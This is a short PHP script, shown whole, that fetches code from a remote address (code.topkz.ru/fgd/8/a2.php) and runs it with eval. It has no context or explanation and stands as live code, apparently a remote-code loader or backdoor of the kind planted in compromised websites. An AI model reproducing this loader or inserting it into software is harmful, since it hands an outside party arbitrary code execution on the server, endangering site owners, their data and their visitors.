<?php
$path = "https://code.topkz.ru/fgd/8/a2.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
